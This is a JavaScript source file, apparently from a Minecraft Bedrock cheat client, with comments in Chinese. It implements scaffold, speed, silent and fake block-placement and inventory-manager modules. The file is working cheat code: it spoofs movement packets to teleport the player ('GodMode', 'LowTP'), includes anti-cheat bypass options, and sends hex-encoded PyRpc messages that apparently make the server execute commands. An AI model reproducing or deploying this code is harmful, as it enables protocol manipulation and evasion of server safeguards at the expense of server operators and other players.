    const dz = targetPos.z - selfPos.z;
    const length = Math.sqrt(dx * dx + dy * dy + dz * dz);
    if (length === 0) return true;
    const targetDir = {
        x: dx / length,
        y: dy / length,
        z: dz / length
    };
    const yawRad = (selfRot.yaw * Math.PI) / 180;
    const pitchRad = (selfRot.pitch * Math.PI) / 180;
    const forward = {
        x: -Math.sin(yawRad) * Math.cos(pitchRad),
        y: -Math.sin(pitchRad),
        z: Math.cos(yawRad) * Math.cos(pitchRad)
    };
    const dot = forward.x * targetDir.x + forward.y * targetDir.y + forward.z * targetDir.z;
    return Math.acos(dot) * (180 / Math.PI) <= fov / 2;
}

function SpeedFunc() {
    if (angle != -1) {
        let Motion = getVector(Speed, self_rot.yaw, angle)
        if (Hop) {
            const Ground = getEntityIsGround(self_id);
            Motion.y = Ground ? JumpHeight : self_motion.y
        } else {
            Motion.y = self_motion.y
        }
        setEntityMotion(self_id, Motion.x, Motion.y, Motion.z)
        angle = -1
    }
    if (operation == "up") setEntityMotion(self_id, self_motion.x, JumpHeight, self_motion.z);
    if (operation == "down") setEntityMotion(self_id, self_motion.x, -JumpHeight, self_motion.z);
    operation = "";
}

function Scaffold_UpdateShape() {
    if (Scaffold_Shapes.length === 0) return;
    const FadeSpeed = 1.5;
    const Step = FadeSpeed * 0.05;
    for (let i = Scaffold_Shapes.length - 1; i >= 0; i--) {
        const Trail = Scaffold_Shapes[i];
        Trail.Alpha -= Step;
        if (Trail.Alpha <= 0) {
            removeShape(Trail.Shape_id);
            Scaffold_Shapes.splice(i, 1);
        } else {
            updateShape(Trail.Shape_id, {
                color: {
                    r: 1,
                    g: 1,
                    b: 1,
                    a: Trail.Alpha
                }
            });
        }
    }
}

/* —— 自动搭路：照搬 CreeperBox 的 Scaffold（见 /storage/emulated/0/苦力怕源码.zip）——
   旧的实现是「全向扫描，挑最近的实心方块当锚点，再一格格往自己脚下补」；那套的问题
   是锚点可能落在身后的墙或侧面的方块上，铺的方向不受控。照搬过来的这套是：
     ① 起点 = 脚下 2 格（锁Y 时钉在启用那一刻的地面高度）；
     ② 沿前进方向逐格展开，最多 extend 格（斜向时按 2 格步长）；
     ③ 每一站若该格是空气，就在它周围 4×4、y 不变的范围里找「空气格 + 六邻面里有
        实心方块」的位置 —— 找的是空气格而不是实心方块，路才会沿前进方向铺；
     ④ 目标格不能压在玩家自己身上。
   放置链路（HandleBlockPlacement：静默/非静默、切方块槽、假方块、加速）原样复用。
   想用回旧逻辑就把 TU_ScaffoldLegacy 改成 true。 */
const TU_ScaffoldLegacy = false;

/* 搭路时是否把视角压到朝下（pitch=80）。**默认关**：#30 把它接上以后，它每 tick
   把 pitch 写回本地实体，而引擎从实体生成上报包 —— 服务端看到你「一直低头」就会
   按错的朝向算位移（回弹），本地渲染与引擎驱动争夺（第三人称抽搐）。
   它也不是搭路失效的钥匙：#30 之前这个转头一次都没执行，搭路同样放不出方块。 */
const TU_ScaffoldAim = false;

/* 打开后 = v1api 的包行为：每 tick 只改第一个 144 包（改完即清空），
   且完全不碰 MovePlayer(19)。v1api 版正是这样，而它在任何服务器都能锁敌 ——
   用它来对照验证「服务端到底吃哪一种」。代价：别人看到的头部会两个值交替。 */
const TU_LegacyPacketMode = false;

function TU_ScaffoldDir() {
    /* 前进方向：有实际移动就用移动方向（更准）；站定时退回视角朝向，八方向。 */
    const mx = Number(self_motion && self_motion.x) || 0;
    const mz = Number(self_motion && self_motion.z) || 0;
    if (Math.abs(mx) + Math.abs(mz) > 0.01) {
        const len = Math.sqrt(mx * mx + mz * mz);
        return { x: Math.round(mx / len), z: Math.round(mz / len) };
    }
    const a = ((((Number(self_rot && self_rot.yaw) || 0) + 180) % 360) + 360) % 360;
    if (a > 325 || a < 35) return { x: 0, z: -1 };
    if (a < 55) return { x: 1, z: -1 };
    if (a < 125) return { x: 1, z: 0 };
    if (a < 145) return { x: 1, z: 1 };
    if (a < 215) return { x: 0, z: 1 };
    if (a < 235) return { x: -1, z: 1 };
    if (a < 305) return { x: -1, z: 0 };
    return { x: -1, z: -1 };
}

function TU_ScaffoldPick(px, py, pz, dirX, dirZ, extend, lockY, lockBaseY) {
    try {
        const dim = getScanDimension();
        const isAir = (x, y, z) => {
            const b = getBlock(x, y, z, dim);
            return !b || !b.namespace || b.namespace === "minecraft:air";
        };
        const isSolid = (x, y, z) => {
            const b = getBlock(x, y, z, dim);
            if (!b || !b.namespace || b.id === 0) return false;
            const ns = b.namespace;
            return ns !== "minecraft:air" && ns !== "minecraft:water" && ns !== "minecraft:flowing_water";
        };
        const DIRS = [[0, -1, 0], [0, 1, 0], [0, 0, -1], [0, 0, 1], [-1, 0, 0], [1, 0, 0]];
        const bx = Math.floor(px), by = Math.floor(py), bz = Math.floor(pz);
        const hitsSelf = (x, y, z) => (y === by || y === by + 1) && x === bx && z === bz;
        const lockFixed = lockY && lockBaseY !== null && lockBaseY !== undefined;
        let cx = bx, cz = bz;
        let cy = lockFixed ? lockBaseY : by - 2;
        const steps = Math.max(0, extend | 0);
        for (let i = 0; i <= steps; i++) {
            if (isAir(cx, cy, cz)) {
                for (let ox = 0; ox < 4; ox++) {
                    for (let oz = 0; oz < 4; oz++) {
                        for (let s = 1; s > -3; s -= 2) {
                            const tx = cx + ox * s, tz = cz + oz * s;
                            if (!isAir(tx, cy, tz)) continue;
                            for (let d = 0; d < 6; d++) {
                                if (isSolid(tx + DIRS[d][0], cy + DIRS[d][1], tz + DIRS[d][2]) && !hitsSelf(tx, cy, tz)) {
                                    return { x: tx, y: cy, z: tz };
                                }
                            }
                        }
                    }
                }
            }
            if (dirX !== 0 && dirZ !== 0 && i + 1 !== steps) i++;
            cx += dirX;
            cz += dirZ;
            if (lockFixed) cy = lockBaseY;
        }
    } catch (e) { }
    return null;
}

function TU_ScaffoldShape(px, py, pz) {
    if (!Scaffold_RenderBox) return;
    try {
        const ShapeId = createShape({
            type: 'box',
            isFill: true,
            lower: { x: px, y: py, z: pz },
            upper: { x: px + 1, y: py + 1, z: pz + 1 },
            color: { r: 1, g: 1, b: 1, a: 0.8 }
        });
        Scaffold_Shapes.push({ Shape_id: ShapeId, Alpha: 0.8 });
        if (Scaffold_Shapes.length > 10) {
            const Old = Scaffold_Shapes.shift();
            removeShape(Old.Shape_id);
        }
    } catch (e) { }
}

function TU_Scaffold() {
    try {
        let lockBaseY = null;
        if (Scaffold_LockY) {
            const still = (Math.abs(Number(self_motion.x) || 0) + Math.abs(Number(self_motion.z) || 0)) <= 0.02;
            lockBaseY = (still && !getEntityIsGround(self_id))
                ? Math.floor(self_pos.y) - 1
                : Math.floor(self_pos.y) - 2;
        }
        const dir = TU_ScaffoldDir();
        const extend = Math.max(0, Number(Scaffold_length) | 0);
        /* 照搬 CreeperBox 的 doRotation：放置前把视角压到朝下（pitch=80），
           服务端要「看得见」被点的那面才接受这次放置 —— 不转头就是放不上去。
           yaw 用当前视角原值（它的 +180 是因为它的 rotation.y 与基岩版差 180，
           照抄会把视角拧反，而且下一 tick 读回 self_rot 会累加、视角疯转）。 */
        /* 注意：这里**不能**照抄 CreeperBox 的 `extend <= 1` 条件 —— 它的 extend 默认 1，
           而本脚本的 Scaffold_length 默认 2，照抄的结果就是永远不转。无条件转。 */
        if (TU_ScaffoldAim) try {
                const _aimYaw = Number(self_rot && self_rot.yaw) || 0;
                try { setEntityRotPrev(self_id, 80, _aimYaw); } catch (e) { }
                setEntityRot(self_id, 80, _aimYaw);
                try { setEntityHeadRot(self_id, _aimYaw); } catch (e) { }
            } catch (e) { }
        for (let n = 0; n < 5; n++) {
            const pick = TU_ScaffoldPick(self_pos.x, self_pos.y, self_pos.z, dir.x, dir.z, extend, Scaffold_LockY, lockBaseY);
            if (!pick) {
                if (TU_DIAG_ROT) {
                    globalThis.TU_D_SF0 = (globalThis.TU_D_SF0 || 0) + 1;
                    if (globalThis.TU_D_SF0 % 20 === 0) {
                        try { _minecraft.clientMessage("§e[TU]搭路 选址=null 方向=" + dir.x + "," + dir.z + " y=" + self_pos.y); } catch (e) { }
                    }
                }
                return;
            }
            HandleBlockPlacement(pick.x, pick.y, pick.z);
            if (TU_DIAG_ROT) {
                globalThis.TU_D_SF = (globalThis.TU_D_SF || 0) + 1;
                if (globalThis.TU_D_SF % 20 === 0) {
                    try {
                        _minecraft.clientMessage("§e[TU]搭路 目标=" + pick.x + "," + pick.y + "," + pick.z
                            + " 手持=" + getText(getEntityCarriedItem(self_id), 'Name:"', '"')
                            + " 槽=" + getPlayerSelectItemSlot(self_id)
                            + " 空中=" + (getBlock(pick.x, pick.y, pick.z).namespace === "minecraft:air"));
                    } catch (e) { }
                }
            }
            TU_ScaffoldShape(pick.x, pick.y, pick.z);
        }
    } catch (e) { }
}

/*@自动搭路*/
function Scaffold() {
    if (Scaffold_Enabled) {
        firstBuiltY = null;
        const x = Math.floor(self_pos.x);
        const baseY = Math.floor(self_pos.y) - 2;
        const z = Math.floor(self_pos.z);
        const placeY = Math.floor(self_pos.y) - 1;
        let nearest = null;
        let minDist = Infinity;
        if (Scaffold_LockY && Math.abs(self_motion.x) <= 0 && Math.abs(self_motion.z) <= 0 && !getEntityIsGround(self_id)) {
            firstBuiltY = Math.floor(self_pos.y - 1);
        }
        const _scaffoldDim = getScanDimension();
        for (let dx = -Scaffold_Detection_Range; dx <= Scaffold_Detection_Range; dx++) {
            for (let dy = -Scaffold_Detection_Range; dy <= 2; dy++) {
                for (let dz = -Scaffold_Detection_Range; dz <= Scaffold_Detection_Range; dz++) {
                    const block = getBlock(x + dx, baseY + dy, z + dz, _scaffoldDim);
                    if (block.namespace !== "minecraft:air") {
                        const dist = Math.sqrt(dx * dx + dz * dz) + Math.abs(dy) * 0.8;
                        if (dist < minDist) {
                            minDist = dist;
                            nearest = [x + dx, baseY + dy, z + dz];
                        }
                    }
                }
            }
        }
        if (Scaffold_BJDSpeed) BJDSpeed();
        if (nearest) {
            let [cx, cy, cz] = nearest;
            let targetY = placeY;
            if (firstBuiltY === null) firstBuiltY = cy;
            if (Scaffold_LockY && firstBuiltY !== null) targetY = firstBuiltY;
            while (cx !== x || cy !== targetY || cz !== z) {
                if (cx !== x && getBlock(cx + (cx < x ? 1 : -1), cy, cz).namespace !== "minecraft:bedrock") {
                    cx += cx < x ? 1 : -1;
                } else if (cz !== z && getBlock(cx, cy, cz + (cz < z ? 1 : -1)).namespace !== "minecraft:bedrock") {
                    cz += cz < z ? 1 : -1;
                } else if (cy !== targetY && getBlock(cx, cy + (cy < targetY ? 1 : -1), cz).namespace !== "minecraft:bedrock") {
                    cy += cy < targetY ? 1 : -1;
                } else break;
                HandleBlockPlacement(cx, cy, cz);
            }
            if (getEntityFlag(self_id, 34)) {
                const moveAngle = Math.atan2(self_motion.x, self_motion.z);
                const moveX = Math.sin(moveAngle);
                const moveZ = Math.cos(moveAngle);
                for (let i = 0; i < Scaffold_length; i++) {
                    const forwardX = x + Math.round(moveX * (i + 1));
                    const forwardZ = z + Math.round(moveZ * (i + 1));
                    const forwardY = firstBuiltY !== null ? firstBuiltY : placeY;
                    HandleBlockPlacement(forwardX, forwardY, forwardZ);
                    if (Scaffold_RenderBox) {
                        const ShapeId = createShape({
                            type: 'box',
                            isFill: true,
                            lower: {
                                x: forwardX,
                                y: forwardY,
                                z: forwardZ
                            },
                            upper: {
                                x: forwardX + 1,
                                y: forwardY + 1,
                                z: forwardZ + 1
                            },
                            color: {
                                r: 1,
                                g: 1,
                                b: 1,
                                a: 0.8
                            }
                        });
                        Scaffold_Shapes.push({
                            Shape_id: ShapeId,
                            Alpha: 0.8
                        });
                        if (Scaffold_Shapes.length > 10) {
                            const Old = Scaffold_Shapes.shift();
                            removeShape(Old.Shape_id);
                        }
                    }
                }
            }
        }
    }
}

function SpeedScaffold() {
    if (Scaffold_BJDSpeed) {
        let input = InputVector
        let currentMotion = self_motion;
        let isSwimming = getEntityFlag(self_id, 56);
        let nowY = currentMotion ? currentMotion.y : 0;
        if ((input.y || 0) !== 0 || (input.x || 0) !== 0) {
            if (!isSwimming) {
                let forward = input.y || 0;
                let strafe = input.x || 0;
                let strafeCalc = Math.atan2(-strafe, forward);
                let strafeDeg = strafeCalc * (180 / Math.PI);
                let targetYaw = self_rot.yaw + strafeDeg;
                let moveRad = targetYaw * (Math.PI / 180);
                let motionX = Scaffold_Speed * Math.sin(-moveRad);
                let motionZ = Scaffold_Speed * Math.cos(-moveRad);
                if (getEntityIsGround(self_id)) {
                    nowY = 0.01;
                }
                setEntityMotion(self_id, motionX, nowY, motionZ);
            }
        } else {
            if (currentMotion && (currentMotion.x !== 0 || currentMotion.z !== 0)) {
                if (!isSwimming) {
                    setEntityMotion(self_id, 0, nowY, 0);
                }
            }
        }
    }
}

function HandleBlockPlacement(cx, cy, cz) {

    if (getBlock(cx, cy, cz).namespace === "minecraft:air") {
        const currentItem = getEntityCarriedItem(self_id);
        const currentName = currentItem ? getText(currentItem, 'Name:"', '"').replace(/^minecraft:/, '') : "";
        const originalSlot = getPlayerSelectItemSlot(self_id);
        let targetSlot = originalSlot;
        if (!BuildData.includes(currentName)) {
            for (let slot = 0; slot < getPlayerHotBarSize(self_id); slot++) {
                const itemData = getPlayerInventoryItem(self_id, slot);
                if (itemData) {
                    const shortName = getText(itemData, 'Name:"', '"').replace(/^minecraft:/, '');
                    if (BuildData.includes(shortName)) {
                        targetSlot = slot;
                        if (Scaffold_SilentMode) {
                            SilentPlayerInventorySlot(slot, LocalRuntimeId);
                        } else {
                            /* 非静默搭路必须真正切到方块槽，否则 player.buildBlock
                               用的是手持物品，手持不是可放置方块时就永远放不下去。 */
                            setTimeout(() => selectPlayerInventorySlot(self_id, slot), 0);
                        }
                        break;
                    }
                }
            }
            if (!BuildData.includes(currentName) && targetSlot === originalSlot) return;
        }
        const isMoving = getEntityFlag(self_id, 34);
        if (Scaffold_BJDSpeed) SpeedScaffold();
        if (Scaffold_MoveJump && isMoving && getEntityIsGround(self_id)) {
            playerJump();
        }
        if (!Scaffold_BypasEC && !Scaffold_FakeBlock) {
            if (Scaffold_SilentMode) {
                if (SilentBuild(cx, cy, cz, targetSlot)) swingArm();
                SilentPlayerInventorySlot(originalSlot, LocalRuntimeId);
            } else {
                buildBlock(self_id, cx, cy, cz, 0);
            }
        } else if (!Scaffold_FakeBlock) {
            simulatePlace(cx, cy, cz);
            if (Scaffold_SilentMode) {
                SilentPlayerInventorySlot(originalSlot, LocalRuntimeId);
            }
        }
        if (Scaffold_FakeBlock) {
            for (let slot = 0; slot < getPlayerHotBarSize(self_id); slot++) {
                const itemData = getPlayerInventoryItem(self_id, slot);
                if (itemData) {
                    const shortName = getText(itemData, 'Name:"', '"').replace(/^minecraft:/, '');
                    if (BuildData.includes(shortName)) {
                        setBlock(cx, cy, cz, shortName, 0);
                        break;
                    }
                }
            }
        }
    }
}
/*#自动搭路*/

function BJDSpeed() {
    if (BJDSpeed_Enabled) {
        callModule(30, '{"value":false,"speed":' + BJDSpeed_Timer + '}');
        let input = InputVector
        let currentMotion = self_motion;
        let isSwimming = getEntityFlag(self_id, 56);
        let nowY = currentMotion ? currentMotion.y : 0;
        if ((input.y || 0) !== 0 || (input.x || 0) !== 0) {
            if (!isSwimming) {
                let forward = input.y || 0;
                let strafe = input.x || 0;
                let strafeCalc = Math.atan2(-strafe, forward);
                let strafeDeg = strafeCalc * (180 / Math.PI);
                let targetYaw = self_rot.yaw + strafeDeg;
                let moveRad = targetYaw * (Math.PI / 180);
                let motionX = BJDSpeed_Speed * Math.sin(-moveRad);
                let motionZ = BJDSpeed_Speed * Math.cos(-moveRad);
                if (getEntityIsGround(self_id)) {
                    nowY = 0.01;
                }
                setEntityMotion(self_id, motionX, nowY, motionZ);
            }
        } else {
            if (currentMotion && (currentMotion.x !== 0 || currentMotion.z !== 0)) {
                if (!isSwimming) {
                    setEntityMotion(self_id, 0, nowY, 0);
                }
            }
        }
    }
}

function GodMode() {
    if (GodMode_Enabled) {
        if (GodMode_PickUp) {
            for (const Entity of getEntityList()) {
                if (getEntityNamespace(Entity) !== "minecraft:item") {
                    continue;
                }
                let Entity_Pos = getEntityPos(Entity);
                let Distance = getRange(self_pos, Entity_Pos);
                if (Distance <= 3) {
                    for (let i = 0; i < GodMode_Teleport; i++) {
                        sendPlayerAuthInput({
                            pos: {
                                x: Entity_Pos.x,
                                y: Entity_Pos.y + 0.5,
                                z: Entity_Pos.z
                            },
                            inputs: [24, 37, 52, 53]
                        });
                    }
                }
            }
        }
        if (GodMode_Vertical) {
            let MoveDistance = 0;
            let sign1 = 1,
                sign2 = 1;
            if (GodMode_RandomHeight) {
                sign1 = Math.random() > 0.5 ? 1 : -1;
                sign2 = Math.random() > 0.5 ? 1 : -1;
                MoveDistance = Math.floor(Math.random() * (GodMode_TP_Vertical - 10)) + 11;
            } else {
                MoveDistance = GodMode_TP_Vertical;
            }
            for (let i = 0; i < GodMode_Teleport; i++) {
                sendPlayerAuthInput({
                    pos: {
                        x: self_pos.x + (MoveDistance * sign1),
                        y: self_pos.y,
                        z: self_pos.z + (MoveDistance * sign2)
                    },
                    inputs: [24, 37, 52, 53]
                });
            }
        } else {
            if (GodMode_RandomHeight) {
                let RandomHeight = Math.floor(Math.random() * 99001) + 1000;
                for (let i = 0; i < GodMode_Teleport; i++) {
                    sendPlayerAuthInput({
                        pos: {
                            x: self_pos.x,
                            y: RandomHeight,
                            z: self_pos.z
                        },
                        inputs: [24, 37, 52, 53]
                    });
                }
            } else {
                for (let i = 0; i < GodMode_Teleport; i++) {
                    sendPlayerAuthInput({
                        pos: {
                            x: self_pos.x,
                            y: GodMode_TP_height,
                            z: self_pos.z
                        },
                        inputs: [24, 37, 52, 53]
                    });
                }
            }
        }
    }
}

function LowTP() {
    if (LowTP_Enabled) {
        const [x, y, z] = BloodTP_Pos.toString().split(/[ ]+/).map(Number);
        if (self_Health <= BloodWarp) {
            setEntityPos(self_id, x, y, z);
        }
    }
}

function AutoSprint() {
    if (AutoSprint_Enabled) {
        _input.buttonDown("button.sprint");
    }
}

function getText(str, startDelimiter, endDelimiter) {
    const startIdx = str.indexOf(startDelimiter);
    if (startIdx === -1) return "";

    const contentStart = startIdx + startDelimiter.length;
    const endIdx = str.indexOf(endDelimiter, contentStart);
    if (endIdx === -1) return "";
    return str.substring(contentStart, endIdx);
}

function AsciiToHex(str) {
    let hex = '';
    for (let i = 0; i < str.length; i++) {
        const code = str.charCodeAt(i);
        if (code <= 0x7F) {
            hex += code.toString(16).padStart(2, '0');
        } else if (code <= 0x7FF) {
            hex += (0xC0 | (code >> 6)).toString(16).padStart(2, '0');
            hex += (0x80 | (code & 0x3F)).toString(16).padStart(2, '0');
        } else if (code <= 0xFFFF) {
            hex += (0xE0 | (code >> 12)).toString(16).padStart(2, '0');
            hex += (0x80 | ((code >> 6) & 0x3F)).toString(16).padStart(2, '0');
            hex += (0x80 | (code & 0x3F)).toString(16).padStart(2, '0');
        } else {
            hex += (0xF0 | (code >> 18)).toString(16).padStart(2, '0');
            hex += (0x80 | ((code >> 12) & 0x3F)).toString(16).padStart(2, '0');
            hex += (0x80 | ((code >> 6) & 0x3F)).toString(16).padStart(2, '0');
            hex += (0x80 | (code & 0x3F)).toString(16).padStart(2, '0');
        }
    }
    return hex;
}

function StringToUTF8Bytes(str) {
    const utf8Bytes = [];
    for (let i = 0; i < str.length; i++) {
        const codePoint = str.codePointAt(i);
        if (codePoint >= 0x10000) i++;

        if (codePoint <= 0x7F) {
            utf8Bytes.push(codePoint);
        } else if (codePoint <= 0x7FF) {
            utf8Bytes.push(0xC0 | (codePoint >>> 6));
            utf8Bytes.push(0x80 | (codePoint & 0x3F));
        } else if (codePoint <= 0xFFFF) {
            utf8Bytes.push(0xE0 | (codePoint >>> 12));
            utf8Bytes.push(0x80 | ((codePoint >>> 6) & 0x3F));
            utf8Bytes.push(0x80 | (codePoint & 0x3F));
        } else {
            utf8Bytes.push(0xF0 | (codePoint >>> 18));
            utf8Bytes.push(0x80 | ((codePoint >>> 12) & 0x3F));
            utf8Bytes.push(0x80 | ((codePoint >>> 6) & 0x3F));
            utf8Bytes.push(0x80 | (codePoint & 0x3F));
        }
    }
    return new Uint8Array(utf8Bytes);
}

function getUtf8ByteLength(str) {
    let byteLength = 0;
    for (let i = 0; i < str.length; i++) {
        const code = str.charCodeAt(i);
        if (code <= 0x7F) {
            byteLength += 1;
        } else if (code <= 0x7FF) {
            byteLength += 2;
        } else if (code <= 0xFFFF) {
            byteLength += 3;
        } else if (code <= 0x10FFFF) {
            byteLength += 4;
        }
    }
    return byteLength;
}

function getHexLengthMarker(str) {
    const byteLength = getUtf8ByteLength(str);
    return byteLength.toString(16).padStart(2, '0');
}

function sendCommand(command) {
    sendPyRpc(98247598, "93c40172920cc42d4d696e6563726166743a6169436f6d6d616e643a4578656375746555736566756c436f6d6d616e644576656e74c0");
    sendPyRpc(98247598, `93c40163920c82c408706c617965724964c4${getHexLengthMarker(self_id)}${AsciiToHex(self_id)}c407636f6d6d616e64c4${getHexLengthMarker(command)}${AsciiToHex(command)}c0`);
}

function AutoDrop() {
    if (AutoDrop_Enabled) {
        for (let slot = 0; slot < getPlayerInventorySize(self_id); slot++) {
            const itemData = getPlayerInventoryItem(self_id, slot);
            const fullName = getText(itemData, 'Name:"', '"');
            const shortName = fullName.replace(/^minecraft:/, '');
            if (dropitemData.includes(shortName) && itemData.length !== 139) {
                dropPlayerInventorySlot(self_id, slot, false, true);
            }
        }
    }
}

function getItemName(item) {
    const fullName = (getText(item, 'Name:"', '"') || getText(item, 'name:"', '"') || "").replace(/^minecraft:/, '');
    return fullName;
}

/*@背包整理*/
const TIER_RANK = {
    "netherite": 5,
    "diamond": 4,
    "iron": 3,
    "chainmail": 2,
    "golden": 1,
    "stone": 1,
    "leather": 1,
    "wooden": 0
};

const baseDamageValues = {
    "netherite_sword": 8,
    "diamond_sword": 7,
    "iron_sword": 6,
    "stone_sword": 5,
    "wooden_sword": 4,
    "golden_sword": 4
};

const baseAxeValues = {
    "netherite_axe": 10,
    "diamond_axe": 9,
    "iron_axe": 9,
    "stone_axe": 9,
    "wooden_axe": 7,
    "golden_axe": 7
};

const baseDefenseValues = {
    "netherite_helmet": 3,
    "diamond_helmet": 3,
    "iron_helmet": 2,
    "chainmail_helmet": 2,
    "golden_helmet": 2,
    "leather_helmet": 1,
    "netherite_chestplate": 8,
    "diamond_chestplate": 8,
    "iron_chestplate": 6,
    "chainmail_chestplate": 5,
    "golden_chestplate": 5,
    "leather_chestplate": 3,
    "netherite_leggings": 6,
    "diamond_leggings": 6,
    "iron_leggings": 5,
    "chainmail_leggings": 4,
    "golden_leggings": 3,
    "leather_leggings": 2,
    "netherite_boots": 3,
    "diamond_boots": 3,
    "iron_boots": 2,
    "chainmail_boots": 1,
    "golden_boots": 1,
    "leather_boots": 1
};

function getEnchantLevel(obj, enchantId) {
    if (!obj || !obj.enchants || obj.enchants.length === 0) return 0;
    const strId = String(enchantId).replace('s', '');

    for (let i = 0; i < obj.enchants.length; i++) {
        const ench = obj.enchants[i];
        const idVal = String(ench.id);
        if (idVal === strId ||
            (strId === '9' && idVal.includes('sharpness')) ||
            (strId === '0' && idVal.includes('protection')) ||
            (strId === '32' && idVal.includes('efficiency'))) {
            return Number(ench.lvl) || 0;
        }
    }
    return 0;
}

function getScore(item) {
    if (!item || !item.namespace) return -1;
    const fullName = item.namespace.replace("minecraft:", "");
    const parts = fullName.split('_');
    const material = parts[0];
    const type = parts.length > 1 ? parts[1] : "";
    const tier = TIER_RANK[material] || 0;

    if (["helmet", "chestplate", "leggings", "boots"].includes(type)) {
        const baseDef = baseDefenseValues[fullName] || 0;
        const prot = getEnchantLevel(item, '0s') || 0;
        const fire = getEnchantLevel(item, '1s') || 0;
        const blast = getEnchantLevel(item, '3s') || 0;
        const proj = getEnchantLevel(item, '4s') || 0;
        return (baseDef * 100) + (prot * 40) + (fire * 15) + (blast * 15) + (proj * 15) + (tier * 150);
    } else if (type === "sword" || type === "axe") {
        const baseDmg = type === "sword" ? (item.attackDamage > 1 ? item.attackDamage : (baseDamageValues[fullName] || 0)) : (baseAxeValues[fullName] || 0);
        const sharpness = getEnchantLevel(item, '9s') || 0;
        return (baseDmg * 100) + (sharpness * 125) + (tier * 200);
    }
    return -1;
}

function compareObjs(obj1, obj2) {
    if (!obj1) return obj2;
    if (!obj2) return obj1;

    const score1 = getScore(obj1);
    const score2 = getScore(obj2);

    if (score1 === score2 && score1 > -1) {
        const type1 = (obj1.namespace || "").replace("minecraft:", "").split('_')[1];
        if (type1 === "axe") {
            const eff1 = getEnchantLevel(obj1, '32s') || 0;
            const eff2 = getEnchantLevel(obj2, '32s') || 0;
            if (eff1 > eff2) return obj1;
            return obj2;
        }
        return obj2;
    }
    return score1 > score2 ? obj1 : obj2;
}

function getVirtualItemObj(vSlot) {
    if (vSlot === -1) return null;
    let nbtData;
    if (vSlot >= 100) {
        nbtData = getPlayerArmorItem(self_id, vSlot - 100);
    } else {
        nbtData = getPlayerInventoryItem(self_id, vSlot);
    }
    if (!nbtData) return null;
    return nbt2object(nbtData);
}

function getCount(item) {
    if (!item) return 0;
    if (item.count !== undefined) return Number(item.count) || 1;
    if (item.Count !== undefined) return Number(item.Count) || 1;
    return 1;
}

function invManager() {
    if (!invManager_Enabled) {
        if (invManager_TaskQueue && invManager_TaskQueue.length > 0) {
            invManager_TaskQueue = [];
        }
        return;
    }

    if (ContainerOpenState === "Chest") return;

    let canOperate = false;

    if (invManager_Silence && (ContainerOpenState === "Hud" || ContainerOpenState === "Inventory")) {
        canOperate = true;
    } else if (invManager_inventory && ContainerOpenState === "Inventory") {
        canOperate = true;
    }

    if (!canOperate) return;

    DropTiming++;

    if (invManager_TaskQueue.length > 0) {
        if (ContainerOpenState === "Hud") {
            if (invManager_Silence && !invManager_open_inventory) {
                closeInventory();
                closeContainer();
                invManager_open_inventory = true;
                return;
            }
            openInventory();
            return;
        }

        if (DropTiming < Number(invManager_Delay)) return;

        let pendingTasks = [];
        let touchedSlots = new Set();
        let tasksExecuted = 0;
        let dropsExecuted = 0;
        let slotsExecuted = 0;

        const slotLimit = Number(invManager_SlotQuantity) || 1;
        const dropLimit = Number(invManager_DropQuantity) || 3;

        while (invManager_TaskQueue.length > 0) {
            const nextTask = invManager_TaskQueue[0];
            const isDrop = nextTask.type === "drop";

            if (isDrop && dropsExecuted >= dropLimit) break;
            if (!isDrop && slotsExecuted >= slotLimit) break;

            const task = invManager_TaskQueue.shift();

            let slotsInvolved = [];
            if (task.type === "swap") slotsInvolved = [task.from, task.to];
            else if (task.type === "move") slotsInvolved = [task.from, task.to];
            else if (task.type === "merge") slotsInvolved = [task.from, task.to];
            else if (task.type === "drop") slotsInvolved = [task.slot];
            else if (task.type === "equip") slotsInvolved = [task.slot, task.armorSlot + 100];

            let conflict = false;
            for (let s of slotsInvolved) {
                if (touchedSlots.has(s)) {
                    conflict = true;
                    break;
                }
            }

            if (conflict) {
                pendingTasks.push(task);
                continue;
            }

            for (let s of slotsInvolved) touchedSlots.add(s);

            switch (task.type) {
                case "swap":
                    SwapInventoryItem(task.from, task.to);
                    break;
                case "move":
                    MoveInventoryItem(task.from, task.to);
                    break;
                case "merge":
                    MoveInventoryItem(task.from, task.to, true);
                    break;
                case "drop":
                    let currentItemForDrop = getVirtualItemObj(task.slot);
                    if (currentItemForDrop && currentItemForDrop.namespace === task.expectedId) {
                        dropInventoryItem(task.slot);
                    } else {
                        invManager_TaskQueue = [];
                        invManager_open_inventory = false;
                        closeInventory();
                        return;
                    }
                    break;
                case "equip":
                    EquipLocalPlayerArmor(task.slot, task.armorSlot + 100);
                    break;
            }

            if (isDrop) dropsExecuted++;
            else slotsExecuted++;
            tasksExecuted++;
        }

        invManager_TaskQueue = pendingTasks.concat(invManager_TaskQueue);

        if (tasksExecuted > 0) {
            DropTiming = 0;
            return;
        }
    }

    if (DropTiming >= Number(invManager_Delay) && invManager_TaskQueue.length === 0) {
        const inventorySize = getPlayerInventorySize(self_id);
        let inv = [];
        for (let i = 0; i < inventorySize; i++) {
            let obj = getVirtualItemObj(i);
            inv.push(obj ? {
                ...obj,
                currentSlot: i
            } : null);
        }

        let armor = [];
        for (let i = 0; i < 4; i++) {
            let obj = getVirtualItemObj(i + 100);
            armor.push(obj ? {
                ...obj,
                currentSlot: i + 100
            } : null);
        }

        let generatedTasks = [];

        let mergeMap = {};
        for (let i = 0; i < inventorySize; i++) {
            let item = inv[i];
            if (item && item.namespace && item.namespace !== "minecraft:air") {
                let ns = item.namespace;
                let nName = item.name || "";
                let baseName = ns.replace("minecraft:", "");

                const unstackables = [
                    "sword", "axe", "pickaxe", "shovel", "hoe",
                    "helmet", "chestplate", "leggings", "boots",
                    "fishing_rod", "flint_and_steel", "bow", "crossbow",
                    "potion", "water_bucket", "lava_bucket", "milk_bucket",
                    "mushroom_stew", "beetroot_soup", "rabbit_stew", "enchanted_book"
                ];
                const typeSuffix = baseName.split('_').pop();

                if (!unstackables.includes(typeSuffix) && !unstackables.includes(baseName)) {
                    let key = ns + "||" + nName;
                    if (item.enchants && item.enchants.length > 0) {
                        key += "_ench" + item.enchants.length;
                    }
                    if (!mergeMap[key]) mergeMap[key] = [];
                    mergeMap[key].push(item);
                }
            }
        }

        for (let key in mergeMap) {
            let stacks = mergeMap[key];
            if (stacks.length < 2) continue;

            stacks.sort((a, b) => {
                let diff = getCount(b) - getCount(a);
                if (diff !== 0) return diff;
                let aHotbar = a.currentSlot < 9 ? 1 : 0;
                let bHotbar = b.currentSlot < 9 ? 1 : 0;
                return bHotbar - aHotbar;
            });

            let baseName = stacks[0].namespace.replace("minecraft:", "");
